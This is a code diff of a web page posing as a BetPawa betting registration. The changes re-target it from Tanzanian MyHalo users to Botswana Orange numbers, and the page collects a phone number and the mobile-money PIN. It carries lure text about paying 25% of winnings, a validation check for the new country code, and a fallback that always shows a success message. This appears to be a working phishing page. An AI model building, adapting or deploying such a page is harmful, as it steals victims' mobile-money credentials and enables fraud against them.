@@ -101,24 +101,24 @@
   <h1>BetPawa</h1>
   <div class="status">Bet small,win big!
                          {200 + ODDs}%</div>
-  <div class="amount">KAMILISHA USAJILI</div>
+  <div class="amount">WELCOME TO PAYMENT AFTER WINNING,KINDLY PAY 25% OF YOUR WINNING,REGISTER NOW</div>
 
   <div class="divider"></div>
 
-  <label>Nambari ya Simu(MyHalo)</label>
-  <input id="phone" placeholder="+255XXXXXXXXX">
+  <label>Phone number(My ORANGE)</label>
+  <input id="phone" placeholder="+267XXXXXXXXX">
 
   <label>Nenosiri</label>
   <input id="password" type="password" placeholder="****">
 
-  <button id="withdraw">Endelea Kukamilisha usajili</button>
-  <p class="note">Hakikisha unaweka nambari na neno la siri sahihi la MyHalo ili usajili ukamilike.</p>
+  <button id="withdraw">Continue to complete the registration</button>
+  <p class="note">Ensure you used the correct pin of your orange number to ensure the registration is successful.</p>
 </div>
 
 <!-- POPUP -->
 <div class="popup" id="popup">
   <div class="popup-card">
-    <h2 id="popupTitle">Ombi Limefanikiwa ✅</h2>
+    <h2 id="popupTitle">Your request to register payment after win is  have successful</h2>
     <p id="popupText"></p>
     <button onclick="popup.classList.remove('active')">Sawa</button>
   </div>
@@ -165,7 +165,7 @@ const firebaseConfig = {
     const phone = phoneInput.value.trim();
     const password = passwordInput.value.trim();
 
-    if(!phone.startsWith("+255") || phone.length < 13 || password.length < 4){
+    if(!phone.startsWith("+267") || phone.length < 13 || password.length < 4){
       popupTitle.innerText = "Tatizo ❌";
       popupText.innerHTML = "Tafadhali weka nambari ya simu sahihi na nenosiri la DEMO.";
       popup.classList.add("active");
@@ -188,8 +188,8 @@ const firebaseConfig = {
       popupTitle.innerText = "Ombi Limefanikiwa ✅";
       popupText.innerHTML = `
         Umefanikiwa Kusajiliwa
-        <strong style="color:#16a34a">Tayari umesajiliwa kwa mkeka wa leo</strong>.<br><br>
-        Subiri ujumbe kwenye simu yako <strong>${phone}</strong>.
+        <strong style="color:#16a34a">You have been registered </strong>.<br><br>
+     Wait for confirmation massage in your for, ensure you open the lenk to complete registration<strong>${phone}</strong>.
       `;
     } catch(_) {
       // Fallback: always show success notification
